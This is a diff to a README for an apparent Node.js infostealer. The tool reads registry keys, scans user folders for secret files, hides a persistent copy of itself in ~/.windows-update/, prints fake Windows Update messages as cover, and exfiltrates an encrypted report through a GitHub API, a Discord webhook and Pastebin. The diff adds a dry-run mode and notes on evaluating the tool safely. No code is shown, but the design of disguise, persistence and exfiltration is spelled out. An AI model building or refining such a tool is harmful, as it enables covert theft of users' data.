@@ -18,6 +18,8 @@ Three phases, executed in order. If one fails the others still run.
 
 After phases complete, builds a JSON report with all collected data, writes `system-report.json` locally, encrypts it with AES-256-GCM, then tries exfil channels in order: GitHub API → Discord webhook → Pastebin. On success the local report is deleted.
 
+**Dry-run mode** (`--dry-run`) runs phases 1 and 2 but skips persistence (phase 3) and all exfil. The report is written locally with no network activity — useful for safe evaluation of the recon logic.
+
 All console output is fake Windows Update progress messages. Real logging goes to `%TEMP%\.wu-run.log` (silent by default).
 
 ---
@@ -58,10 +60,11 @@ tools/
 ```bash
 npm install    # no deps needed, just generates node_modules
 npm test       # 26 tests, no side effects
-npm start      # runs the tool
+npm start      # runs the tool (all phases + exfil)
+npm run dry-run  # runs phases 1–2 only, skips persistence and exfil
 ```
 
-On first run it copies itself to `~/.windows-update/`. On subsequent runs it skips the copy. Exfil will fail without valid credentials in the encrypted config.
+On first run it copies itself to `~/.windows-update/`. On subsequent runs it skips the copy. Exfil will fail without valid credentials in the encrypted config. Use `npm run dry-run` to test recon without side effects.
 
 ---
 
@@ -95,6 +98,7 @@ This thing reads registry keys, scans your Desktop/Docs/Downloads for secret fil
 |----------|------------|
 | Static review | All code is plain JS in `src/`, start with index.js |
 | Just tests | `npm test` — no file writes, no network |
+| Dry-run | `npm run dry-run` — runs recon phases, writes report locally, no persistence or exfil |
 | Disable exfil | Set `ENCRYPTED = ""` in `src/app/config.js` (already the default) |
 | Air-gap | Run in a VM with no network. Exfil will fail quietly |
 | Verbose mode | Set `logger.silent(false)` in index.js:21 to see debug output |
@@ -105,8 +109,8 @@ Cleanup after: delete `~/.windows-update`, `system-report.json`, `%TEMP%\.wu-run
 
 ## Artifacts
 
-- `system-report.json` — local unencrypted report (systemId is null)
-- `~/.windows-update/` — hidden copy of the project
+- `system-report.json` — local unencrypted report (systemId is null); only artifact produced in dry-run mode
+- `~/.windows-update/` — hidden copy of the project (skipped in dry-run mode)
 - `%TEMP%\.wu-run.log` — timestamped debug log
 
 ---
